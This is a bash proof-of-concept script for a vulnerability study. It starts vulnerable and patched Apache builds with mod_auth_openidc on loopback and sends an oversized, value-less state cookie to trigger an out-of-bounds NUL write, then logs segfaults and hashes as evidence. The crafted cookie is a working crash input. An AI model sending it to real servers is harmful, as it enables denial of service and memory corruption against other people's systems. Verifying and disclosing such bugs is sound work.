#!/usr/bin/env bash
# W19: OOB NUL store through the SECOND pre-auth caller
# (handle/response.c:353 -> state.c:244 -> pinned :219). W11 reached this
# caller only with an in-bounds second cookie; W12-W16 drove OOB only through
# handle/request.c:132. Here a long value-less state cookie goes to the
# redirect callback on the genuinely non-ASan system httpd/APR stack.
# Loopback 127.0.0.1:18091 only; 18090 is never touched.
# No shim, LD_PRELOAD, ptrace or ASAN_OPTIONS. Fixed tag is the control.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/usr/sbin/apache2
VCONF="$HERE/httpd-sys-response.conf";       VERR="$HERE/error-sys-response.log"
FCONF="$HERE/httpd-sys-response-fixed.conf"; FERR="$HERE/error-sys-response-fixed.log"
URL=http://127.0.0.1:18091/redirect_uri?code=foo\&state=foo
OUT="$HERE/evidence/sys-response"
mkdir -p "$OUT"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"

stop() {
  for c in httpd-sys.conf httpd-sys-fixed.conf httpd-sys-store.conf \
           httpd-sys-store-fixed.conf httpd-sys-response.conf httpd-sys-response-fixed.conf; do
    "$HTTPD" -f "$HERE/$c" -k stop >/dev/null 2>&1 || true
  done
  sleep 2
}
trap stop EXIT

sweep() {
  label="$1" conf="$2" err="$3" cookie="$4" restarts="$5" n="$6"
  : > "$OUT/$label-results.txt"
  for r in $(seq 1 "$restarts"); do
    stop
    : > "$err"
    "$HTTPD" -f "$conf" -k start >"$OUT/$label-$r-start.out" 2>&1 || true
    sleep 2
    : > "$OUT/$label-$r-codes.txt"
    for i in $(seq 1 "$n"); do
      code=$(curl -sS --max-time 6 -o /dev/null -w '%{http_code}' \
        -H "Cookie: $cookie" "$URL" 2>/dev/null || echo CURLERR)
      echo "$code" >> "$OUT/$label-$r-codes.txt"
    done
    faults=$(grep -c 'exit signal\|Segmentation fault' "$err" || true)
    entered=$(grep -c 'oidc_response_proto_state_restore: enter' "$err" || true)
    printf '%s start=%s faults=%s response_caller_enters=%s codes=%s\n' \
      "$label" "$r" "$faults" "$entered" \
      "$(sort "$OUT/$label-$r-codes.txt" | uniq -c | tr '\n' ';')" \
      | tee -a "$OUT/$label-results.txt"
  done
  cp "$err" "$OUT/$label-error.log"
}

{
  echo "date: $(date -u +%FT%TZ)"
  echo "httpd: $(sha256sum "$HTTPD")"
  echo "vuln state.c: $(sha256sum "$HERE/src/mod_auth_openidc-sys/src/state.c")"
  echo "vuln module:  $(sha256sum "$HERE/src/mod_auth_openidc-sys/src/.libs/mod_auth_openidc.so")"
  echo "fixed module: $(sha256sum "$HERE/src/mod_auth_openidc-sys-fixed/src/.libs/mod_auth_openidc.so")"
  echo "--- module ldd (no asan expected) ---"
  ldd "$HERE/src/mod_auth_openidc-sys/src/.libs/mod_auth_openidc.so" | grep -E 'asan|apr|cjose|jansson' || true
  echo "--- sweeps ---"
} | tee "$OUT/summary.txt"

SHORT="mod_auth_openidc_state_novalue"
PAD=$(printf 'a%.0s' $(seq 1 7800))
LONG="mod_auth_openidc_state_$PAD"

# Short token: confirm the response caller is really reached on this config.
sweep vuln_short  "$VCONF" "$VERR" "$SHORT" 1 3
sweep fixed_short "$FCONF" "$FERR" "$SHORT" 1 3
# Long value-less token: the OOB question.
sweep vuln_long   "$VCONF" "$VERR" "$LONG"  4 8
sweep vuln_long_eq "$VCONF" "$VERR" "${LONG}=1" 2 8
sweep fixed_long  "$FCONF" "$FERR" "$LONG"  2 8
